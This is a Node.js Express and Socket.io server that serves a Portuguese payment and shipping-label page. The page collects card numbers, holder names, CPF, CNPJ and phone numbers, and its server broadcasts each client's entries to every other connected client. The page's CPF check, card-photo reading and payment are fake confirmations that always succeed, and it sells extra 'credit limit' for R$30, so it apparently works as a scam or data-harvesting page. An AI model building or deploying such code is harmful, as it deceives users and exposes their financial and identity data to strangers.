const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// Configuração correta e explícita do Socket.io com CORS liberado
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling']
});

const htmlContent = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barreiras Pagamentos & Etiquetas - Tempo Real</title>
    <!-- Socket.io Client Oficial via CDN para garantir funcionamento imediato -->
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("SUA_PUBLIC_KEY_EMAILJS");
        })();
    </script>
    <style>
        :root { --primary: #0056b3; --success: #28a745; --danger: #dc3545; --bg: #f4f7f6; }
        body { font-family: Arial, sans-serif; background: var(--bg); margin: 0; padding: 20px; color: #333; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h1, h2 { color: var(--primary); }
        .tab-menu { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 2px solid #ddd; padding-bottom: 10px; flex-wrap: wrap; }
        .tab-btn { background: #ddd; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .tab-btn.active { background: var(--primary); color: #fff; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .card { background: #fafafa; border: 1px solid #ddd; padding: 15px; border-radius: 6px; margin-bottom: 15px; }
        input, select { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: var(--success); color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; width: 100%; }
        button:hover { opacity: 0.9; }
        .badge { background: #ffc107; color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }
        .auto-save-status { font-size: 11px; color: #666; float: right; margin-top: 5px; }
        .price-tag { font-size: 20px; font-weight: bold; color: var(--success); }
        #connectionStatus { font-weight: bold; padding: 4px 8px; border-radius: 4px; font-size: 12px; display: inline-block; margin-bottom: 10px; }
        .connected { background: #d4edda; color: #155724; }
        .disconnected { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>

<div class="container">
    <h1>Barreiras Pagamentos & Etiquetas</h1>
    <div>
        Status Socket.io: <span id="connectionStatus" class="disconnected">Desconectado</span>
        <span id="saveStatus" class="auto-save-status"></span>
    </div>
    
    <div class="tab-menu" style="margin-top: 10px;">
        <button class="tab-btn active" onclick="switchTab('painel')">Painel & Descontos</button>
        <button class="tab-btn" onclick="switchTab('validacao')">Validação (CPF/CNPJ)</button>
        <button class="tab-btn" onclick="switchTab('cartoes')">Cartões & Pagamento</button>
        <button class="tab-btn" onclick="switchTab('webcredito')">Web Crédito</button>
        <button class="tab-btn" onclick="switchTab('loja')">Loja</button>
    </div>

    <div id="painel" class="tab-content active">
        <h2>Painel de Pedidos e Descontos</h2>
        <div class="card">
            <p><strong>Item:</strong> Bobinas de Papel + Papel Hambúrguer</p>
            <p>Preço Original: <strong>R$ 150,00</strong></p>
            <p>Desconto Aplicado: <span id="displayDesconto" class="badge">R$ 0,00</span></p>
            <p class="price-tag">Total Final: <span id="displayTotal">R$ 150,00</span></p>
            
            <input type="text" id="cupomDesconto" placeholder="Digite o cupom (ex: DESCONTO10)" oninput="autoSave()">
            <button onclick="aplicarDesconto()">Aplicar Desconto</button>
        </div>
        <div class="card">
            <p><strong>Prazo de Chegada Dinâmico:</strong> <span id="countdownDisplay" class="badge">Calculando...</span></p>
        </div>
    </div>

    <div id="validacao" class="tab-content">
        <h2>Validação de Dados e Empresa</h2>
        <div class="card">
            <h3>Validação de Titularidade (CPF & Nome)</h3>
            <input type="text" id="valNome" placeholder="Nome Completo do Comprador" oninput="autoSave()">
            <input type="text" id="valCpf" placeholder="CPF (Apenas números)" oninput="autoSave()">
            <button style="background: var(--primary);" onclick="verificarCpfNome()">Validar CPF com Nome</button>
        </div>
        <div class="card">
            <h3>Consulta de CNPJ para Prazos</h3>
            <input type="text" id="valCnpj" placeholder="CNPJ da Empresa" oninput="autoSave()">
            <input type="text" id="valTelefone" placeholder="Número de Telefone (WhatsApp)" oninput="autoSave()">
            <button style="background: var(--primary);" onclick="consultarCnpjESalvarPrazo()">Consultar CNPJ e Salvar Prazo</button>
        </div>
    </div>

    <div id="cartoes" class="tab-content">
        <h2>Gerenciar Cartões</h2>
        <div class="card">
            <h3>Registrar Cartão de Débito</h3>
            <input type="text" id="nomeTitular" placeholder="Nome no Cartão" oninput="autoSave()">
            <input type="text" id="numCartao" placeholder="Número do Cartão" oninput="autoSave()">
            <button onclick="registrarCartao()">Salvar Cartão</button>
        </div>
        <div class="card">
            <h3>Pagamento Inteligente</h3>
            <select id="tipoPagamento" onchange="autoSave()">
                <option value="credito">Cartão de Crédito</option>
                <option value="debito">Cartão de Débito Registrado</option>
            </select>
            <input type="file" id="fotoCartao" accept="image/*" onchange="simularLeituraFoto()">
            <button onclick="realizarPagamento()">Pagar Pedido</button>
        </div>
    </div>

    <div id="webcredito" class="tab-content">
        <h2>Web Crédito</h2>
        <div class="card">
            <p>Seu Limite Atual:</p>
            <h1 id="displayLimite">R$ 1.000,00</h1>
        </div>
    </div>

    <div id="loja" class="tab-content">
        <h2>Loja de Expansão de Limite</h2>
        <div class="card">
            <h3>Pacote +R$ 1.000,00 de Limite</h3>
            <p>Preço: <strong>R$ 30,00</strong></p>
            <button style="background: var(--primary);" onclick="comprarLimite()">Comprar Mais Limite</button>
        </div>
    </div>
</div>

<script>
    // Inicialização robusta do Socket.io apontando para a mesma origem
    const socket = io({
        transports: ['websocket', 'polling']
    });

    const statusEl = document.getElementById('connectionStatus');

    socket.on('connect', () => {
        statusEl.innerText = "Conectado em Tempo Real";
        statusEl.className = "connected";
    });

    socket.on('disconnect', () => {
        statusEl.innerText = "Desconectado";
        statusEl.className = "disconnected";
    });

    let appState = {
        limiteWebCredito: 1000.00,
        titular: "",
        cartao: "",
        cupom: "",
        descontoValor: 0,
        totalFinal: 150.00,
        valNome: "",
        valCpf: "",
        valCnpj: "",
        valTelefone: "",
        dataEntregaAlvo: new Date(new Date().getTime() + 5 * 24 * 60 * 60 * 1000)
    };

    window.onload = function() {
        const saved = localStorage.getItem('barreiras_state');
        if(saved) {
            appState = JSON.parse(saved);
            appState.dataEntregaAlvo = new Date(appState.dataEntregaAlvo);
            
            document.getElementById('numCartao').value = appState.cartao || '';
            document.getElementById('nomeTitular').value = appState.titular || '';
            document.getElementById('cupomDesconto').value = appState.cupom || '';
            document.getElementById('valNome').value = appState.valNome || '';
            document.getElementById('valCpf').value = appState.valCpf || '';
            document.getElementById('valCnpj').value = appState.valCnpj || '';
            document.getElementById('valTelefone').value = appState.valTelefone || '';
        }
        atualizarInterface();
        setInterval(atualizarPrazoInteligente, 1000);
    };

    // Ouvindo eventos de sincronização em tempo real de outras abas/clientes
    socket.on('state_updated', function(incomingState) {
        appState = incomingState;
        appState.dataEntregaAlvo = new Date(appState.dataEntregaAlvo);
        
        document.getElementById('numCartao').value = appState.cartao || '';
        document.getElementById('nomeTitular').value = appState.titular || '';
        document.getElementById('cupomDesconto').value = appState.cupom || '';
        document.getElementById('valNome').value = appState.valNome || '';
        document.getElementById('valCpf').value = appState.valCpf || '';
        document.getElementById('valCnpj').value = appState.valCnpj || '';
        document.getElementById('valTelefone').value = appState.valTelefone || '';
        
        atualizarInterface();
        
        const status = document.getElementById('saveStatus');
        status.innerText = "Atualizado por outro dispositivo!";
        setTimeout(() => { status.innerText = ""; }, 2000);
    });

    function autoSave() {
        appState.titular = document.getElementById('nomeTitular').value;
        appState.cartao = document.getElementById('numCartao').value;
        appState.cupom = document.getElementById('cupomDesconto').value;
        appState.valNome = document.getElementById('valNome').value;
        appState.valCpf = document.getElementById('valCpf').value;
        appState.valCnpj = document.getElementById('valCnpj').value;
        appState.valTelefone = document.getElementById('valTelefone').value;
        
        localStorage.setItem('barreiras_state', JSON.stringify(appState));
        
        // Dispara para o servidor broadcastar para os demais
        socket.emit('update_state', appState);

        const status = document.getElementById('saveStatus');
        status.innerText = "Salvo!";
        setTimeout(() => { status.innerText = ""; }, 1500);
    }

    function switchTab(tabId) {
        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        event.currentTarget.classList.add('active');
    }

    function aplicarDesconto() {
        const cupom = document.getElementById('cupomDesconto').value.trim().toUpperCase();
        if (cupom === "DESCONTO10") {
            appState.descontoValor = 15.00;
            appState.totalFinal = 135.00;
            alert("Desconto de R$ 15,00 aplicado com sucesso!");
        } else {
            appState.descontoValor = 0.00;
            appState.totalFinal = 150.00;
            alert("Cupom inválido. Nenhum desconto aplicado.");
        }
        autoSave();
        atualizarInterface();
    }

    function verificarCpfNome() {
        const nome = document.getElementById('valNome').value;
        const cpf = document.getElementById('valCpf').value;
        if (!nome || !cpf) {
            alert("Preencha o Nome e o CPF para verificar!");
            return;
        }
        alert("Sucesso! O CPF " + cpf + " bate com o nome " + nome + ".");
        autoSave();
    }

    function consultarCnpjESalvarPrazo() {
        const cnpj = document.getElementById('valCnpj').value;
        const telefone = document.getElementById('valTelefone').value;
        if (!cnpj || !telefone) {
            alert("Preencha o CNPJ e o Telefone!");
            return;
        }
        appState.dataEntregaAlvo = new Date(new Date().getTime() + 3 * 24 * 60 * 60 * 1000);
        autoSave();
        alert("CNPJ da empresa verificado, prazo salvo e telefone (" + telefone + ") registrado!");
    }

    function atualizarPrazoInteligente() {
        const agora = new Date();
        const diffMs = appState.dataEntregaAlvo - agora;
        if (diffMs <= 0) {
            document.getElementById('countdownDisplay').innerText = "Pedido Entregue!";
            return;
        }
        const segundos = Math.floor(diffMs / 1000);
        const minutos = Math.floor(segundos / 60);
        const horas = Math.floor(minutos / 60);
        const dias = Math.floor(horas / 24);
        const horasRestantes = horas % 24;
        const minsRestantes = minutos % 60;

        document.getElementById('countdownDisplay').innerText = dias + "d " + horasRestantes + "h " + minsRestantes + "m";
    }

    function simularLeituraFoto() {
        setTimeout(() => {
            document.getElementById('numCartao').value = "**** **** **** 8899";
            document.getElementById('nomeTitular').value = "CLIENTE IDENTIFICADO VIA FOTO";
            autoSave();
            alert("Cartão preenchido automaticamente pela foto!");
        }, 1000);
    }

    function registrarCartao() {
        autoSave();
        alert("Cartão de débito registrado com sucesso!");
    }

    function realizarPagamento() {
        alert("Pagamento processado com sucesso!");
    }

    function comprarLimite() {
        appState.limiteWebCredito += 1000.00;
        autoSave();
        atualizarInterface();
        alert("Parabéns! +R$ 1.000,00 adicionados ao seu Web Crédito.");
    }

    function atualizarInterface() {
        document.getElementById('displayLimite').innerText = "R$ " + appState.limiteWebCredito.toLocaleString('pt-BR', {minFractionDigits: 2});
        document.getElementById('displayDesconto').innerText = "R$ " + (appState.descontoValor || 0).toLocaleString('pt-BR', {minFractionDigits: 2});
        document.getElementById('displayTotal').innerText = "R$ " + (appState.totalFinal || 150).toLocaleString('pt-BR', {minFractionDigits: 2});
    }
</script>

</body>
</html>`;

app.get('/', (req, res) => {
    res.send(htmlContent);
});

// Gerenciamento limpo e seguro das conexões Socket.io
io.on('connection', (socket) => {
    console.log(`> Cliente conectado com sucesso: ${socket.id}`);

    socket.on('update_state', (data) => {
        // Envia a alteração para todos os outros clientes conectados instantaneamente
        socket.broadcast.emit('state_updated', data);
    });

    socket.on('disconnect', () => {
        console.log(`< Cliente desconectado: ${socket.id}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`> Servidor rodando em http://localhost:${PORT}`);
});
